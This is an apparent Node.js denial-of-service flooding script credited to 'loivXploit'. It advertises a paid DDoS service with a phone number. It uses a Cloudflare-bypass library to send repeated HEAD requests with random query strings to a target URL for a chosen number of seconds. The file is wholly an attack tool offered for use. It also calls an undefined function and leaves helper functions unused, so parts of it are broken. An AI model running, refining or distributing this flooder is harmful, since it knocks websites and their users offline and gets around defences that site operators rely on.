require('events').EventEmitter.defaultMaxListeners = 0;
const CloudflareBypasser = require('cloudflare-bypasser');
const cryptoRandomString = require('crypto-random-string');
const path = require('path');
const colors = require('colors');

let cf = new CloudflareBypasser();

console.log("Tools by loivXploit chat me for ddos prem:6285176804206");  

if (process.argv.length !== 4) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> 
Usage: node ${path.basename(__filename)} <http://example.com> <60>`);
    process.exit(0);
}

const target = process.argv[2];
const time = process.argv[3];

function randomString(length) {
    return cryptoRandomString({ length });
}

function randomHeaders() {
    const headersList = [
        { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0" },
        { "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36" },
        { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15" },
        { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" },
        { "User-Agent": "Mozilla/5.0 (Linux; U; Android 4.0.4; en-US; Nexus 7 Build/IMM76D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1" },
        { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36" },
        { "User-Agent": "Mozilla/5.0 (Linux; Android 8.0; Mobile; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36" },
        { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0" },
        { "Referer": target },
        { "Referer": target + "/somepath" },
        { "Referer": target + "/anotherpath" },
        { "Accept-Language": "en-US,en;q=0.90" },
        { "Accept-Language": "en-US,en;q=0.90" },
        { "Accept-Language": "en-US,en;q=0.90" },
        { "Accept-Language": "en-US,en;q=0.90" }
    ];
    return headersList[Math.floor(Math.random() * headersList.length)];
}

function randomURI() {
    const randomParams = `/?v=${randomString(16)}&x=${randomString(8)}&y=${randomString(12)}`;
    return target + randomParams;
}

function send_req() {
    cf.request({
        method: 'HEAD',
        uri: target + '/?s=' + cryptoRandomString({ length: 32 }) + cryptoRandomString({ length: 1, characters: '|=' }) + cryptoRandomString({ length: 32 }) + cryptoRandomString({ length: 1, characters: '|=' }) + cryptoRandomString({ length: 32 }),
    }).then(res => {
        
    }).catch(err => {
        
    });
}

function flood() {
    setInterval(() => {
        for (let i = 0; i < Math.floor(Math.random() * 5) + 1; i++) {
            send_req();
            sendRequest();  
        }
        
        Array.prototype.random = function (length) { return this[Math.floor((Math.random() * length))]; }
        var color = ['yellow', 'cyan', 'magenta', 'red', 'green', 'blue', 'rainbow'];
        var rcolor = color.random(color.length);
        console.log(("Flooding By loivXploit")[rcolor]);
    }, 500);
}

flood();

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0);
}, time * 1000);